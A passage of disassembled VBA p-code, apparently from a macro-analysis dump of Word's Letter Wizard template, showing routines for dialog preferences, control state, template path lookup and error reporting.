\tDim \n' \tVarDefn v\n' Line #1325:\n' \tDim \n' \tVarDefn nerr\n' Line #1326:\n' \tLd kWizname$ \n' \tLd id$ \n' \tLitStr 0x000B \"wordwiz.ini\"\n' \tLd WordBasic \n' \tArgsMemLd [GetPrivateProfileString$] 0x0003 \n' \tLd WordBasic \n' \tArgsMemLd Val 0x0001 \n' \tLitDI2 0x0001 \n' \tSub \n' \tSt v \n' \tQuoteRem 0x0060 0x000D \"get the value\"\n' Line #1327:\n' \tLd v \n' \tLitDI2 0x0000 \n' \tLt \n' \tIf \n' \tBoSImplicit \n' \tLd defaultVal \n' \tSt v \n' \tEndIf \n' \tQuoteRem 0x0024 0x0026 \"ensure legal value (unless too big...)\"\n' Line #1328:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError TooBig \n' Line #1329:\n' \tLd id$ \n' \tLd v \n' \tLd WordBasic \n' \tArgsMemCall DlgValue 0x0002 \n' Line #1330:\n' \tGoTo rdvpexit \n' Line #1331:\n' \tLabel TooBig \n' Line #1332:\n' \tLd Err \n' \tMemLd Number \n' \tSt nerr \n' Line #1333:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError (GoTo 0) \n' Line #1334:\n' \tLd nerr \n' \tLitDI2 0x0009 \n' \tEq \n' \tIfBlock \n' \tQuoteRem 0x0018 0x0027 \"subscript out of range ... v is too big\"\n' Line #1335:\n' \tLd id$ \n' \tLd defaultVal \n' \tLd WordBasic \n' \tArgsMemCall DlgValue 0x0002 \n' Line #1336:\n' \tElseBlock \n' Line #1337:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tLd WordBasic \n' \tArgsMemCall ScreenUpdating 0x0001 \n' \tQuoteRem 0x0024 0x001B \"make sure this is turned on\"\n' Line #1338:\n' \tLd nerr \n' \tError \n' \tQuoteRem 0x0014 0x000E \"report the err\"\n' Line #1339:\n' \tEndIfBlock \n' Line #1340:\n' \tLabel rdvpexit \n' Line #1341:\n' \tEndSub \n' Line #1342:\n' Line #1343:\n' \tFuncDefn (Private Sub SaveDlgPref(id))\n' Line #1344:\n' \tLd id$ \n' \tLd id$ \n' \tLd WordBasic \n' \tArgsMemLd [DlgText$] 0x0001 \n' \tArgsCall xStorePref 0x0002 \n' Line #1345:\n' \tEndSub \n' Line #1346:\n' Line #1347:\n' \tFuncDefn (Private Sub RstDlgPref(id, defaultStr))\n' Line #1348:\n' \tDim \n' \tVarDefn v\n' Line #1349:\n' \tLd kWizname$ \n' \tLd id$ \n' \tLitStr 0x000B \"wordwiz.ini\"\n' \tLd WordBasic \n' \tArgsMemLd [GetPrivateProfileString$] 0x0003 \n' \tSt v$ \n' Line #1350:\n' \tLd v$ \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd defaultStr$ \n' \tSt v$ \n' \tEndIf \n' Line #1351:\n' \tLd v$ \n' \tLitStr 0x0001 \"~\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0000 \"\"\n' \tSt v$ \n' \tEndIf \n' Line #1352:\n' \tLd id$ \n' \tLd v$ \n' \tLd WordBasic \n' \tArgsMemCall DlgText 0x0002 \n' Line #1353:\n' \tEndSub \n' Line #1354:\n' Line #1355:\n' \tFuncDefn (Private Sub SaveDlgMultiLinePref(id))\n' Line #1356:\n' \tDim \n' \tVarDefn v\n' Line #1357:\n' \tDim \n' \tVarDefn idx\n' Line #1358:\n' \tDim \n' \tVarDefn count_\n' Line #1359:\n' \tLd id$ \n' \tLd WordBasic \n' \tArgsMemLd [DlgText$] 0x0001 \n' \tSt v$ \n' Line #1360:\n' \tLd v$ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tFnInStr \n' \tSt idx \n' Line #1361:\n' \tLitDI2 0x0001 \n' \tSt count_ \n' Line #1362:\n' \tLd idx \n' \tLitDI2 0x0000 \n' \tGt \n' \tParen \n' \tWhile \n' Line #1363:\n' \tLd id$ \n' \tLd count_ \n' \tArgsLd Str 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [LTrim$] 0x0001 \n' \tAdd \n' \tLd v$ \n' \tLd idx \n' \tLitDI2 0x0001 \n' \tSub \n' \tLd WordBasic \n' \tArgsMemLd [Left$] 0x0002 \n' \tArgsCall xStorePref 0x0002 \n' Line #1364:\n' \tLd v$ \n' \tFnLen \n' \tLd idx \n' \tGt \n' \tIf \n' \tBoSImplicit \n' \tLd v$ \n' \tLd idx \n' \tLitDI2 0x0001 \n' \tAdd \n' \tArgsLd Mid$ 0x0002 \n' \tSt v$ \n' \tElse \n' \tBoSImplicit \n' \tLitStr 0x0000 \"\"\n' \tSt v$ \n' \tEndIf \n' Line #1365:\n' \tLd v$ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tFnInStr \n' \tSt idx \n' Line #1366:\n' \tLd count_ \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt count_ \n' Line #1367:\n' \tWend \n' Line #1368:\n' \tLd id$ \n' \tLd count_ \n' \tArgsLd Str 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [LTrim$] 0x0001 \n' \tAdd \n' \tLd v$ \n' \tArgsCall xStorePref 0x0002 \n' Line #1369:\n' \tLd id$ \n' \tLitStr 0x0005 \"Lines\"\n' \tAdd \n' \tLd count_ \n' \tArgsLd Str 0x0001 \n' \tArgsCall xStorePref 0x0002 \n' Line #1370:\n' \tEndSub \n' Line #1371:\n' Line #1372:\n' \tFuncDefn (Private Sub RstDlgMultiLinePref(id, defaultStr))\n' Line #1373:\n' \tDim \n' \tVarDefn count_\n' Line #1374:\n' \tDim \n' \tVarDefn v\n' Line #1375:\n' \tDim \n' \tVarDefn False\n' Line #1376:\n' \tLd id$ \n' \tLitStr 0x0005 \"Lines\"\n' \tAdd \n' \tArgsLd xFetchPref$ 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd Val 0x0001 \n' \tSt count_ \n' Line #1377:\n' \tLd count_ \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #1378:\n' \tLd defaultStr$ \n' \tSt v$ \n' Line #1379:\n' \tElseBlock \n' Line #1380:\n' \tLd id$ \n' \tLd count_ \n' \tArgsLd Str 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [LTrim$] 0x0001 \n' \tAdd \n' \tArgsLd xFetchPref$ 0x0001 \n' \tSt v$ \n' Line #1381:\n' \tLd v$ \n' \tLitStr 0x0001 \"~\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0000 \"\"\n' \tSt v$ \n' \tEndIf \n' Line #1382:\n' \tLd count_ \n' \tLitDI2 0x0001 \n' \tSub \n' \tSt count_ \n' Line #1383:\n' \tLd count_ \n' \tLitDI2 0x0000 \n' \tGt \n' \tWhile \n' Line #1384:\n' \tLd id$ \n' \tLd count_ \n' \tArgsLd Str 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [LTrim$] 0x0001 \n' \tAdd \n' \tArgsLd xFetchPref$ 0x0001 \n' \tSt False$ \n' Line #1385:\n' \tLd False$ \n' \tLitStr 0x0001 \"~\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0000 \"\"\n' \tSt False$ \n' \tEndIf \n' Line #1386:\n' \tLd False$ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd v$ \n' \tAdd \n' \tSt v$ \n' Line #1387:\n' \tLd count_ \n' \tLitDI2 0x0001 \n' \tSub \n' \tSt count_ \n' Line #1388:\n' \tWend \n' Line #1389:\n' \tEndIfBlock \n' Line #1390:\n' \tLd id$ \n' \tLd v$ \n' \tLd WordBasic \n' \tArgsMemCall DlgText 0x0002 \n' Line #1391:\n' \tEndSub \n' Line #1392:\n' Line #1393:\n' \tQuoteRem 0x0000 0x0003 \"===\"\n' Line #1394:\n' Line #1395:\n' \tFuncDefn (Private Sub ItemsInState(howMany))\n' Line #1396:\n' \tLd LastState \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt LastState \n' Line #1397:\n' \tLd howMany \n' \tLd LastState \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd StateItems__ 0x0001 \n' \tAdd \n' \tLd LastState \n' \tArgsSt StateItems__ 0x0001 \n' Line #1398:\n' \tEndSub \n' Line #1399:\n' Line #1400:\n' \tFuncDefn (Private Sub EnableControls())\n' \tQuoteRem 0x001D 0x0017 \"Enable/Disable controls\"\n' Line #1401:\n' \tLd State \n' \tLitDI2 0x0001 \n' \tGt \n' \tIfBlock \n' Line #1402:\n' \tLitDI2 0x0005 \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall DlgEnable 0x0002 \n' \tQuoteRem 0x0021 0x0005 \"<Back\"\n' Line #1403:\n' \tEndIfBlock \n' Line #1404:\n' \tLd State \n' \tLd LastState \n' \tLt \n' \tIfBlock \n' Line #1405:\n' \tLitDI2 0x0006 \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall DlgEnable 0x0002 \n' \tQuoteRem 0x0021 0x0005 \"Next>\"\n' Line #1406:\n' \tEndIfBlock \n' Line #1407:\n' \tLd State \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #1408:\n' \tLitDI2 0x0006 \n' \tLd WordBasic \n' \tArgsMemCall DlgFocus 0x0001 \n' \tQuoteRem 0x001D 0x0005 \"Next>\"\n' Line #1409:\n' \tLitDI2 0x0005 \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DlgEnable 0x0002 \n' \tQuoteRem 0x0021 0x0005 \"<Back\"\n' Line #1410:\n' \tLd State \n' \tLd LastState \n' \tEq \n' \tElseIfBlock \n' Line #1411:\n' \tLitDI2 0x0007 \n' \tLd WordBasic \n' \tArgsMemCall DlgFocus 0x0001 \n' \tQuoteRem 0x001D 0x0006 \"finish\"\n' Line #1412:\n' \tLitDI2 0x0006 \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DlgEnable 0x0002 \n' \tQuoteRem 0x0021 0x0004 \"Next\"\n' Line #1413:\n' \tEndIfBlock \n' Line #1414:\n' \tEndSub \n' \tQuoteRem 0x0008 0x000E \"EnableControls\"\n' Line #1415:\n' Line #1416:\n' Line #1417:\n' \tFuncDefn (Private Sub SHControls(FirstField, LimField, SH))\n' \tQuoteRem 0x0031 0x0012 \"Show/Hide controls\"\n' Line #1418:\n' \tDim \n' \tVarDefn iField\n' Line #1419:\n' \tStartForVariable \n' \tLd iField \n' \tEndForVariable \n' \tLd FirstField \n' \tLd LimField \n' \tLitDI2 0x0001 \n' \tSub \n' \tFor \n' Line #1420:\n' \tLd iField \n' \tLd SH \n' \tLd WordBasic \n' \tArgsMemCall DlgVisible 0x0002 \n' Line #1421:\n' \tStartForVariable \n' \tNext \n' Line #1422:\n' \tEndSub \n' \tQuoteRem 0x0008 0x000A \"SHControls\"\n' Line #1423:\n' Line #1424:\n' \tFuncDefn (Private Sub EnabFields(FirstField, LimField, ED))\n' \tQuoteRem 0x0031 0x0017 \"Enable/Disable controls\"\n' Line #1425:\n' \tDim \n' \tVarDefn iField\n' Line #1426:\n' \tStartForVariable \n' \tLd iField \n' \tEndForVariable \n' \tLd FirstField \n' \tLd LimField \n' \tLitDI2 0x0001 \n' \tSub \n' \tFor \n' Line #1427:\n' \tLd iField \n' \tLd ED \n' \tLd WordBasic \n' \tArgsMemCall DlgEnable 0x0002 \n' Line #1428:\n' \tStartForVariable \n' \tNext \n' Line #1429:\n' \tEndSub \n' \tQuoteRem 0x0008 0x000A \"EnabFields\"\n' Line #1430:\n' Line #1431:\n' \tFuncDefn (Private Sub ChangeState(sold, snew))\n' Line #1432:\n' \tLd sold \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd StateItems__ 0x0001 \n' \tParen \n' \tLd sold \n' \tArgsLd StateItems__ 0x0001 \n' \tParen \n' \tLitDI2 0x0000 \n' \tArgsCall SHControls 0x0003 \n' Line #1433:\n' \tLd snew \n' \tArgsLd HideFilePreview__ 0x0001 \n' \tLd sold \n' \tArgsLd HideFilePreview__ 0x0001 \n' \tSub \n' \tIfBlock \n' Line #1434:\n' \tLitDI2 0x0008 \n' \tLd WordBasic \n' \tArgsMemCall DlgVisible 0x0001 \n' Line #1435:\n' \tEndIfBlock \n' Line #1436:\n' \tLd snew \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd StateItems__ 0x0001 \n' \tParen \n' \tLd snew \n' \tArgsLd StateItems__ 0x0001 \n' \tParen \n' \tLitDI2 0x0001 \n' \tArgsCall SHControls 0x0003 \n' Line #1437:\n' \tLd snew \n' \tSt State \n' Line #1438:\n' \tLd snew \n' \tLitDI2 0x0002 \n' \tEq \n' \tLitStr 0x000C \"LetterMethod\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tAnd \n' \tIfBlock \n' Line #1439:\n' \tLitStr 0x0007 \"chkloID\"\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DlgVisible 0x0002 \n' Line #1440:\n' \tLitStr 0x0013 \"chkloWriterInitials\"\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DlgVisible 0x0002 \n' Line #1441:\n' \tLitStr 0x0013 \"chkloTypistInitials\"\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DlgVisible 0x0002 \n' Line #1442:\n' \tLitStr 0x0007 \"chkloCC\"\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DlgVisible 0x0002 \n' Line #1443:\n' \tLitStr 0x000F \"chkloEnclosures\"\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DlgVisible 0x0002 \n' Line #1444:\n' \tLitStr 0x0010 \"chkloAttachments\"\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall DlgVisible 0x0002 \n' Line #1445:\n' \tEndIfBlock \n' Line #1446:\n' \tRem 0x0041 \" Chk if MAPI environment is present to enable AddressBook buttons\"\n' Line #1447:\n' \tLd snew \n' \tLitDI2 0x0005 \n' \tEq \n' \tIfBlock \n' Line #1448:\n' \tLitDI2 0x002B \n' \tLitDI2 0x0000 \n' \tLd kInsertAddress$ \n' \tLd WordBasic \n' \tArgsMemLd CommandValid 0x0001 \n' \tSub \n' \tLd WordBasic \n' \tArgsMemCall DlgEnable 0x0002 \n' Line #1449:\n' \tLitDI2 0x002C \n' \tLitDI2 0x0000 \n' \tLd kInsertAddress$ \n' \tLd WordBasic \n' \tArgsMemLd CommandValid 0x0001 \n' \tSub \n' \tLd WordBasic \n' \tArgsMemCall DlgEnable 0x0002 \n' Line #1450:\n' \tEndIfBlock \n' Line #1451:\n' \tArgsCall EnableControls 0x0000 \n' Line #1452:\n' \tEndSub \n' \tQuoteRem 0x0008 0x000B \"ChangeState\"\n' Line #1453:\n' Line #1454:\n' \tQuoteRem 0x0000 0x0027 \"%%%% Wizard Dialog Control Function %%%\"\n' Line #1455:\n' \tFuncDefn (Private Function DlgControl(id, iaction, wvalue))\n' Line #1456:\n' \tDim \n' \tVarDefn fRet\n' Line #1457:\n' \tDim \n' \tVarDefn idnum\n' Line #1458:\n' \tDim \n' \tVarDefn result\n' Line #1459:\n' \tLitDI2 0x0001 \n' \tSt fRet \n' Line #1460:\n' \tLd iaction \n' \tSelectCase \n' Line #1461:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x0010 0x0004 \"Init\"\n' Line #1462:\n' \tLitDI2 0x0001 \n' \tSt State \n' Line #1463:\n' \tLitDI2 0x0002 \n' \tLd WordBasic \n' \tArgsMemCall DlgVisible 0x0001 \n' \tQuoteRem 0x0023 0x000E \"Hide OK button\"\n' Line #1464:\n' \tLitDI2 0x0003 \n' \tLd WordBasic \n' \tArgsMemCall DlgVisible 0x0001 \n' \tQuoteRem 0x0023 0x001B \"Hide Hint button (no hints)\"\n' Line #1465:\n' \tArgsCall RstDialog 0x0000 \n' \tQuoteRem 0x0018 0x0017 \"restore dialog settings\"\n' Line #1466:\n' \tLitDI2 0x0000 \n' \tArgsLd StateItems__ 0x0001 \n' \tParen \n' \tLd LastState \n' \tArgsLd StateItems__ 0x0001 \n' \tParen \n' \tLitDI2 0x0000 \n' \tArgsCall SHControls 0x0003 \n' \tQuoteRem 0x0047 0x000F \"Hide ALL states\"\n' Line #1467:\n' \tLd State \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd StateItems__ 0x0001 \n' \tParen \n' \tLd State \n' \tArgsLd StateItems__ 0x0001 \n' \tParen \n' \tLitDI2 0x0001 \n' \tArgsCall SHControls 0x0003 \n' \tQuoteRem 0x004B 0x0012 \"Show initial state\"\n' Line #1468:\n' \tLd State \n' \tArgsLd HideFilePreview__ 0x0001 \n' \tLitDI2 0x0000 \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0008 \n' \tLd WordBasic \n' \tArgsMemCall DlgVisible 0x0001 \n' \tEndIf \n' Line #1469:\n' \tArgsCall EnableControls 0x0000 \n' \tQuoteRem 0x001B 0x0017 \"Enable/Disable controls\"\n' Line #1470:\n' \tLitDI2 0x0006 \n' \tLd WordBasic \n' \tArgsMemCall DlgFocus 0x0001 \n' \tQuoteRem 0x0021 0x0005 \"Next>\"\n' Line #1471:\n' \tLitDI2 0x0000 \n' \tSt fRet \n' Line #1472:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x0010 0x0005 \"Click\"\n' Line #1473:\n' \tLd id$ \n' \tLd WordBasic \n' \tArgsMemLd DlgControlId 0x0001 \n' \tSt idnum \n' Line #1474:\n' \tLd id$ \n' \tLd idnum \n' \tArgsLd DoButtonClick 0x0002 \n' \tSt result \n' Line #1475:\n' \tLd result \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #1476:\n' \tLd idnum \n' \tSelectCase \n' Line #1477:\n' \tLitDI2 0x0004 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x0017 0x0006 \"Cancel\"\n' Line #1478:\n' \tLitDI2 0x0000 \n' \tSt fRet \n' \tQuoteRem 0x001D 0x000B \"exit dialog\"\n' Line #1479:\n' \tLitDI2 0x0005 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x0017 0x0005 \"<Back\"\n' Line #1480:\n' \tLd State \n' \tLd State \n' \tArgsLd PrevState 0x0001 \n' \tArgsCall ChangeState 0x0002 \n' Line #1481:\n' \tLitDI2 0x0006 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x0017 0x0005 \"Next>\"\n' Line #1482:\n' \tLd State \n' \tLd State \n' \tArgsLd NextState 0x0001 \n' \tArgsCall ChangeState 0x0002 \n' Line #1483:\n' \tLitDI2 0x002B \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x0018 0x0016 \"Address Book To DAPFEL\"\n' Line #1484:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall SetAddress 0x0001 \n' Line #1485:\n' \tLitDI2 0x0028 \n' \tLd WordBasic \n' \tArgsMemCall DlgFocus 0x0001 \n' Line #1486:\n' \tLitDI2 0x002C \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x0018 0x001A \"Address Book Return DAPFEL\"\n' Line #1487:\n' \tLitDI2 0x0002 \n' \tParen \n' \tArgsCall SetAddress 0x0001 \n' Line #1488:\n' \tLitDI2 0x002A \n' \tLd WordBasic \n' \tArgsMemCall DlgFocus 0x0001 \n' Line #1489:\n' \tCaseElse \n' Line #1490:\n' \tQuoteRem 0x0014 0x0010 \"not gunna happen\"\n' Line #1491:\n' \tEndSelect \n' Line #1492:\n' \tLd result \n' \tLitDI2 0x0001 \n' \tEq \n' \tElseIfBlock \n' Line #1493:\n' \tArgsCall SaveDialog 0x0000 \n' \tQuoteRem 0x001B 0x000D \"save settings\"\n' Line #1494:\n' \tLitDI2 0x0000 \n' \tSt fRet \n' Line #1495:\n' \tEndIfBlock \n' Line #1496:\n' \tLitDI2 0x0003 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x000F 0x0015 \"Item contents changed\"\n' Line #1497:\n' \tQuoteRem 0x000C 0x000B \" do nothing\"\n' Line #1498:\n' \tLitDI2 0x0004 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x000F 0x0012 \"item focus changed\"\n' Line #1499:\n' \tLd id$ \n' \tLd wvalue \n' \tArgsCall ItemFocusChanged 0x0002 \n' Line #1500:\n' \tLitDI2 0x0005 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x000F 0x0004 \"idle\"\n' Line #1501:\n' \tLitStr 0x0000 \"\"\n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' \tQuoteRem 0x0028 0x0010 \"clear status bar\"\n' Line #1502:\n' \tLd WordBasic \n' \tArgsMemLd Window 0x0000 \n' \tLd iEmptyDoc \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd iWorkDoc \n' \tParen \n' \tLd WordBasic \n' \tArgsMemCall WindowList 0x0001 \n' \tEndIf \n' \tQuoteRem 0x0053 0x0013 \"bring work to front\"\n' Line #1503:\n' \tLitDI2 0x0006 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x000F 0x0021 \"updated forced (by moving dialog)\"\n' Line #1504:\n' \tLd iEmptyDoc \n' \tParen \n' \tLd WordBasic \n' \tArgsMemCall WindowList 0x0001 \n' \tQuoteRem 0x0030 0x0022 \"bring the empty window to the fore\"\n' Line #1505:\n' \tCaseElse \n' Line #1506:\n' \tEndSelect \n' Line #1507:\n' \tLd fRet \n' \tSt DlgControl \n' Line #1508:\n' \tEndFunc \n' \tQuoteRem 0x000D 0x000A \"DlgControl\"\n' Line #1509:\n' Line #1510:\n' \tFuncDefn (Private Function StrWizardPath() As String)\n' Line #1511:\n' \tDim \n' \tVarDefn strPath (As String)\n' Line #1512:\n' \tDim \n' \tVarDefn strFileName (As String)\n' Line #1513:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #1514:\n' \tDim \n' \tVarDefn fFound (As Boolean)\n' Line #1515:\n' Line #1516:\n' \tOnError FatalError \n' Line #1517:\n' Line #1518:\n' \tLitVarSpecial (True)\n' \tSt fFound \n' Line #1519:\n' \tLd objWizTemplate \n' \tMemLd path \n' \tSt strPath \n' Line #1520:\n' Line #1521:\n' \tLd strPath \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tEq \n' \tParen \n' \tIfBlock \n' Line #1522:\n' \tQuoteRem 0x0008 0x001D \" New template based on Wizard\"\n' Line #1523:\n' \tQuoteRem 0x0008 0x003C \" Get location of templates - first look in UserTemplatesPath\"\n' Line #1524:\n' \tQuoteRem 0x0008 0x001B \" and then in Workgroup path\"\n' Line #1525:\n' \tLitDI2 0x0000 \n' \tSt i \n' Line #1526:\n' \tLitVarSpecial (False)\n' \tSt fFound \n' Line #1527:\n' \tLd wdUserTemplatesPath \n' \tLd Application \n' \tMemLd Options \n' \tArgsMemLd DefaultFilePath 0x0001 \n' \tSt strPath \n' Line #1528:\n' Line #1529:\n' \tLd i \n' \tLitDI2 0x0002 \n' \tLt \n' \tParen \n' \tLd fFound \n' \tLitVarSpecial (False)\n' \tEq \n' \tAnd \n' \tParen \n' \tWhile \n' Line #1530:\n' \tLd strPath \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tNe \n' \tParen \n' \tIfBlock \n' Line #1531:\n' \tQuoteRem 0x0010 0x002C \" First try to find wizard with long filename\"\n' Line #1532:\n' \tLd strPath \n' \tParamNamed SearchPath \n' \tLd kWizname$ \n' \tLd strWIZ \n' \tConcat \n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed SubDir \n' \tLitDI2 0x0000 \n' \tParamNamed MatchCase \n' \tLd WordBasic \n' \tArgsMemCall FileFind 0x0004 \n' Line #1533:\n' \tLd WordBasic \n' \tArgsMemLd CountFoundFiles 0x0000 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #1534:\n' \tQuoteRem 0x0014 0x0027 \" Try to find wizard with short filename\"\n' Line #1535:\n' \tLd strPath \n' \tParamNamed SearchPath \n' \tLd strWizShortName \n' \tLd strWIZ \n' \tConcat \n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed SubDir \n' \tLitDI2 0x0000 \n' \tParamNamed MatchCase \n' \tLd WordBasic \n' \tArgsMemCall FileFind 0x0004 \n' Line #1536:\n' \tLd WordBasic \n' \tArgsMemLd CountFoundFiles 0x0000 \n' \tLitDI2 0x0000 \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitVarSpecial (True)\n' \tSt fFound \n' \tEndIf \n' Line #1537:\n' \tElseBlock \n' Line #1538:\n' \tLitVarSpecial (True)\n' \tSt fFound \n' Line #1539:\n' \tEndIfBlock \n' Line #1540:\n' \tEndIfBlock \n' Line #1541:\n' Line #1542:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt i \n' Line #1543:\n' \tLd wdWorkgroupTemplatesPath \n' \tLd Application \n' \tMemLd Options \n' \tArgsMemLd DefaultFilePath 0x0001 \n' \tSt strPath \n' Line #1544:\n' \tWend \n' Line #1545:\n' Line #1546:\n' \tLd fFound \n' \tParen \n' \tIfBlock \n' \tQuoteRem 0x0019 0x001F \" Wizard was found, so save path\"\n' Line #1547:\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [FoundFileName$] 0x0001 \n' \tSt strFileName \n' Line #1548:\n' \tLd strFileName \n' \tLitDI2 0x0005 \n' \tLd WordBasic \n' \tArgsMemLd [FileNameInfo$] 0x0002 \n' \tSt strPath \n' Line #1549:\n' \tEndIfBlock \n' Line #1550:\n' \tEndIfBlock \n' Line #1551:\n' Line #1552:\n' \tLd fFound \n' \tParen \n' \tIfBlock \n' Line #1553:\n' \tLd Application \n' \tMemLd PathSeparator \n' \tSt strPathSeparator \n' Line #1554:\n' \tLd strPath \n' \tLitDI2 0x0001 \n' \tArgsLd Right$ 0x0002 \n' \tLd strPathSeparator \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd strPath \n' \tLd strPathSeparator \n' \tConcat \n' \tSt strPath \n' \tEndIf \n' Line #1555:\n' \tLd strPath \n' \tSt StrWizardPath \n' Line #1556:\n' \tExitFunc \n' Line #1557:\n' \tEndIfBlock \n' Line #1558:\n' Line #1559:\n' \tLabel LWizardMissing \n' Line #1560:\n' \tLd strERR_WIZ_NOT_FOUND \n' \tArgsCall MsgBox 0x0001 \n' Line #1561:\n' Line #1562:\n' \tLabel FatalError \n' Line #1563:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1564:\n' \tEndFunc \n' \tQuoteRem 0x000D 0x000E \" StrWizardPath\"\n' Line #1565:\n' Line #1566:\n' Line #1567:\n' \tQuoteRem 0x0000 0x0042 \"main error reporting routine called for fatal errors in the wizard\"\n' Line #1568:\n' \tQuoteRem 0x0000 0x002B \"SHOULD NOT BE CALLED FOR POST-WIZARD ERRORS\"\n' Line #1569:\n' \tFuncDefn (Public Sub ReportError(ByVal ErrorCode As ))\n' Line #1570:\n' \tDim \n' \tVarDefn lErrorCode (As Long)\n' Line #1571:\n' \tDim \n' \tVarDefn strErrorMsg (As String)\n' Line #1572:\n' Line #1573:\n' \tLd ErrorCode \n' \tMemLd Number \n' \tSt lErrorCode \n' Line #1574:\n' \tLd ErrorCode \n' \tMemLd Description \n' \tSt strErrorMsg \n' Line #1575:\n' Line #1576:\n' \tQuoteRem 0x0004 0x0037 \"The next statement seems to reset the ErrorCode object,\"\n' Line #1577:\n' \tQuoteRem 0x0004 0x0022 \"even though it is a ByVal argument\"\n' Line #1578:\n' \tOnError (Resume Next) \n' Line #1579:\n' Line #1580:\n' \tLitVarSpecial (True)\n' \tParen \n' \tArgsCall ResetWizardEnvironment 0x0001 \n' Line #1581:\n' Line #1582:\n' \tLd fBalloonVisible \n' \tIf \n' \tBoSImplicit \n' \tLd objAssistantBalloon \n' \tArgsMemCall Close 0x0000 \n' \tEndIf \n' Line #1583:\n' \tLd lErrorCode \n' \tIf \n' \tBoSImplicit \n' \tLd strErrorMsg \n' \tArgsCall DisplayErrorMsg 0x0001 \n' \tEndIf \n' Line #1584:\n' \tLd lAssistantId \n' \tIf \n' \tBoSImplicit \n' \tLd lAssistantId \n' \tLitVarSpecial (False)\n' \tLd Assistant \n' \tArgsMemCall EndWizard 0x0002 \n' \tEndIf \n' \tQuoteRem 0x0041 0x0019 \"2nd parameter is fSuccess\"\n' Line #1585:\n' Line #1586:\n' \tLd formWizard \n' \tLitNothing \n' \tIs \n' \tParen \n' \tNot \n' \tParen \n' \tIfBlock \n' Line #1587:\n' \tLd formWizard \n' \tArgsMemCall Hide 0x0000 \n' Line #1588:\n' \tLd formWizard \n' \tArgsCall Unlock 0x0001 \n' Line #1589:\n' \tSetStmt \n' \tLitNothing \n' \tSet formWizard \n' Line #1590:\n' \tEndIfBlock \n' Line #1591:\n' Line #1592:\n' \tQuoteRem 0x0004 0x0037 \"ReportError is not called in post-wizard option errors.\"\n' Line #1593:\n' \tQuoteRem 0x0004 0x001B \"So, always closing the doc.\"\n' Line #1594:\n' \tLd wdDoNotSaveChanges \n' \tLd ActiveDocument \n' \tArgsMemCall Close 0x0001 \n' \tQuoteRem 0x002C 0x0020 \"ActiveDocument assumed to be set\"\n' Line #1595:\n' Line #1596:\n' \tQuoteRem 0x0004 0x0014 \"terminate the wizard\"\n' Line #1597:\n' \tEnd \n' Line #1598:\n' Line #1599:\n' \tEndSub \n' 